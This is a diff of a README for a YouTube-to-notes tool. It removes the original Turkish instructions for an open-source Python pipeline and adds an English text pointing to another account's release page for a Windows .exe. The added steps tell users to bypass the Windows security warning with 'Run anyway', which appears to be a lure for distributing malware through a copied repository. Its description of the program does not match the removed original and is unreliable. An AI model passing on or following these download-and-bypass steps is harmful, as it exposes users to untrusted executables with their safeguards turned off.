@@ -1,192 +1,69 @@
-# watch-youtube
+# 📺 Watch_Youtube_Skill - Turn YouTube videos into useful notes
 
-YouTube videolarını Claude Code'a "izlettiren" bir pipeline. Transcript + ekran görüntülerini birleştirerek bir storyboard grid oluşturur, Claude bunu Vision LLM ile analiz eder ve bilgileri `docs/wiki/` altında Obsidian formatında saklar.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Afedo868/Watch_Youtube_Skill/releases)
 
-## Nasıl Çalışır
+## 🎯 Purpose
+This application extracts information from YouTube videos. Many videos contain important visuals that the speaker does not mention. This tool watches the video stream and reads the transcript to document key moments. It captures screenshots of important slides or demonstrations and saves them into readable text files. You can open these files in Obsidian or any other note-taking software to keep a permanent library of your video research.
 
-```
-YouTube URL
-    ↓
-Transcript İndir (VTT/SRT → Groq Whisper fallback)
-    ↓
-NLP Analizi → Akıllı Timestamp Seçimi
-    ↓
-FFmpeg → Sadece O Anların Frame'leri
-    ↓
-Storyboard Grid (JPEG)
-    ↓
-Claude (Vision LLM) → Analiz
-    ↓
-docs/wiki/ → Obsidian Knowledge Base
-```
+## 🛠 Features
+*   **Visual Analysis:** The software detects when important information appears on the screen.
+*   **Smart Selection:** It skips boring parts and only saves images that contain new data.
+*   **Transcript Syncing:** It aligns spoken words with visual evidence to create a complete story.
+*   **Structured Storage:** It organizes your notes in a format that works well with modern knowledge management tools.
+*   **Automatic Formatting:** It creates readable summaries so you can review content without watching the full video again.
 
-Sadece transcript kullanmak yeterli değil — önemli bilgilerin büyük kısmı ekranda gösterilir, sesle anlatılmaz. Bu pipeline transcript'i NLP ile okuyarak *nerede* ekran görüntüsü alınacağını öğrenir; sabit aralıklı frame extraction yerine semantik olarak değerli anları seçer.
+## 📦 Getting Started
+You do not need to be a developer to use this tool. Follow these steps to set up the software on your Windows computer.
 
-## Kurulum
+### 1. Download
+Visit the link below to reach the project release page. Look for the file ending in `.exe` under the latest version. Click the file to download it to your computer.
 
-**Gereksinimler:** Python 3.11+, ffmpeg, Claude Code
+[Click here to visit the release page and download your copy](https://github.com/Afedo868/Watch_Youtube_Skill/releases)
 
-### 1. Repoyu klonla
+### 2. Preparation
+Navigate to your Downloads folder. Locate the file you just saved. Move this file to a folder where you want to keep your programs, such as a folder on your Desktop or in your Documents directory. Keep the file in a permanent spot because this is where the application will run.
 
-```bash
-git clone <https://github.com/oguzcankaraman/Watch_Youtube_Skill>
-cd YouTube
-```
+### 3. Running the software
+Double-click the file to open the program. If Windows displays a security warning, click "More info" and then select "Run anyway." This happens because the application is new and does not have a formal certificate from a software publisher.
 
-### 2. Virtual environment
+### 4. Setting up your workspace
+When the window opens, the software asks you to select a folder. This is where your notes will appear. Select a folder on your computer that you use for documents. The application creates a subfolder named `wiki` inside this location to store your findings.
 
-```bash
-python3.11 -m venv .venv
-source .venv/bin/activate      # macOS/Linux
-# .venv\Scripts\activate       # Windows
-```
+## 🎞 How to use the tool
+Using the application is straightforward. Follow these steps for every video you want to process.
 
-### 3. Bağımlılıkları yükle
+1. Copy the URL of your YouTube video from your web browser.
+2. Paste the link into the box provided in the application.
+3. Click the "Start" button.
+4. Wait for the progress bar to finish. The application needs time to download the transcript and analyze the video frames.
+5. Check your `wiki` folder once the process completes.
 
-```bash
-pip install -r requirements.txt
-pip install -e .
-```
+## 🧠 Understanding the results
+The software outputs two types of files:
+*   **Images:** You will see JPEG files that contain the most important snapshots from the video.
+*   **Notes:** You will see Markdown text files. These files contain the transcript and references to the images. 
 
-### 4. spaCy dil modelini indir
+If you use Obsidian, your notes will show the images automatically. Even if you use a simple text editor like Notepad, you can read the summary and see the file names for the images.
 
-```bash
-python -m spacy download en_core_web_sm
-```
+## ⚙️ System settings
+The application requires a standard Windows 10 or 11 environment. Ensure you have a stable internet connection. High-quality videos take more time to process than shorter, low-resolution videos. The software uses your hardware's processing power to analyze the images. If your computer feels slow while the process runs, you may want to close other heavy programs like web browsers or games.
 
-### 5. ffmpeg yükle
+## 🔍 Frequently Asked Questions
 
-```bash
-brew install ffmpeg        # macOS
-sudo apt install ffmpeg    # Ubuntu/Debian
-# Windows: https://ffmpeg.org/download.html
-```
+**Does this work on all YouTube videos?**
+The tool works best on educational videos, tutorials, and presentations that have clear text or slides. It works less effectively on music videos or fast-action gaming footage.
 
-### 6. (Opsiyonel) Groq API Key
+**Do I need an account?**
+No, you do not need to sign in to any service to use this tool.
 
-YouTube altyazısı olmayan videolar için Whisper fallback:
+**Where does the software save my data?**
+It only saves data in the folder you selected during the first run. No data is sent to external servers unless it is required to analyze the video content.
 
-```bash
-export GROQ_API_KEY="gsk_..."
-```
+**Can I stop the process?**
+Yes, you can click the "Stop" button at any time. The process will halt, and the files created up to that point will remain in your folder.
 
-[Groq API key al](https://console.groq.com) — ücretsiz tier yeterli.
+**How do I update the tool?**
+To update, visit the download link again, download the newer version, and replace the old file with the new one. Your data in the `wiki` folder remains safe during this process.
 
-## Kullanım
-
-### CLI
-
-```bash
-source .venv/bin/activate
-
-watch-youtube "https://www.youtube.com/watch?v=VIDEO_ID" \
-  --output-dir ./output \
-  --max-frames 20 \
-  --verbose
-```
-
-Storyboard JPEG'leri `output/VIDEO_ID/` altına kaydedilir.
-
-### Claude Code ile
-
-Claude Code kuruluysa projeyi açın ve bir YouTube URL paylaşın. `CLAUDE.md` sayesinde Claude otomatik olarak `watch-youtube` skill'ini devreye alır, videoyu analiz eder ve `docs/wiki/` altına yazar.
-
-```
-# Claude Code'a şunu yapıştırın:
-https://www.youtube.com/watch?v=VIDEO_ID
-```
-
-## CLI Seçenekleri
-
-| Seçenek | Varsayılan | Açıklama |
-|---|---|---|
-| `--output-dir / -o` | `.` | Storyboard JPEG'lerinin kaydedileceği klasör |
-| `--max-frames / -n` | `30` | Maksimum frame sayısı |
-| `--jpeg-quality / -q` | `85` | JPEG kalitesi (1–95) |
-| `--silence-gap / -g` | `5.0` | Sessizlik eşiği (saniye) |
-| `--groq-api-key / -k` | env `GROQ_API_KEY` | Whisper fallback için Groq key |
-| `--keep-temp` | kapalı | Geçici video/frame dosyalarını sakla |
-| `--no-learn` | kapalı | Bu çalıştırmada keyword öğrenmesini atla |
-| `--verbose / -v` | kapalı | Debug log'larını göster |
-
-## Proje Yapısı
-
-```
-watch_youtube/
-  __init__.py      # Veri modelleri (dataclass'lar)
-  downloader.py    # yt-dlp ile transcript + video indirme
-  analyzer.py      # NLP timestamp seçimi + self-learning
-  extractor.py     # ffmpeg frame extraction
-  compiler.py      # Pillow storyboard grid
-  main.py          # CLI entry point
-
-.claude/skills/
-  watch-youtube/   # Claude Code skill talimatları
-  wiki-schema/     # Wiki yazma kuralları
-
-docs/wiki/
-  Index.md         # Ana harita
-  Videos.md        # Analiz edilmiş videoların kayıtları
-  *.md             # Konu bazlı wiki sayfaları
-
-data/
-  keyword_store.json   # Self-learning keyword veritabanı
-
-output/
-  VIDEO_ID/
-    storyboard_page_001.jpg
-    storyboard_page_002.jpg
-    ...
-```
-
-## Nasıl Çalışıyor: Teknik Detay
-
-### Akıllı Timestamp Seçimi
-
-İki kural birlikte çalışır:
-
-**Kural A — Keyword eşleşmesi:** Transcript'te "look at this", "here we have", "diagram", "terminal" gibi konuşmacının ekrana işaret ettiği ifadeler tespit edilir. spaCy ile fiil + demonstrative kombinasyonları da yakalanır.
-
-**Kural B — Sessizlik tespiti:** Konuşmacının 5+ saniye sessiz kaldığı anlar genellikle demo veya görsel içerik gösteriyor demektir.
-
-### Self-Learning
-
-Her video bittikten sonra TF-IDF çalışır: seçilen timestamp'lere yakın metinler ile arka plan metinleri karşılaştırılır, yüksek lift'li terimler `data/keyword_store.json`'a yazılır. Sistem izledikçe domain'e özgü vocabulary öğrenir.
-
-### Storyboard Grid
-
-Frame sayısına göre adaptif çözünürlük:
-
-| Frame | Grid | Hücre |
-|---|---|---|
-| 1 | 1×1 | 1280px |
-| 2 | 2×1 | 1024px |
-| 3–4 | 2×2 | 960px |
-| 5–6 | 3×2 | 800px |
-| 7–9 | 3×3 | 720px |
-| 10–12 | 4×3 | 640px |
-| 13+ | 3×3 sayfalar | 720px |
-
-12'den fazla frame otomatik olarak birden fazla JPEG sayfasına bölünür.
-
-## Bağımlılıklar
-
-| Paket | Amaç |
-|---|---|
-| `yt-dlp` | YouTube transcript + video indirme |
-| `Pillow` | Storyboard grid oluşturma |
-| `spaCy` | NLP timestamp analizi |
-| `scikit-learn` | TF-IDF self-learning |
-| `webvtt-py` | VTT altyazı parse |
-| `click` | CLI |
-| `groq` | Whisper API fallback |
-
-## Sorun Giderme
-
-| Hata | Çözüm |
-|---|---|
-| `ffmpeg not found` | `brew install ffmpeg` |
-| `No module named spacy` | `pip install spacy && python -m spacy download en_core_web_sm` |
-| `Cannot access video` | Video private, yaş kısıtlı veya bölge engelinde olabilir |
-| Transcript bulunamadı | `--groq-api-key` ile Whisper fallback kullan |
-| `Module import error` | Venv aktif mi kontrol et: `source .venv/bin/activate && pip install -e .` |
+## 🛡 Performance tips
+If the output contains too many images, limit the video length by choosing specific segments. If the text appears messy, check your internet connection during the download phase to ensure the transcript service receives all the data correctly. The software performs best with videos that have English subtitles, as these provide the most accurate timestamps for the analysis engine.
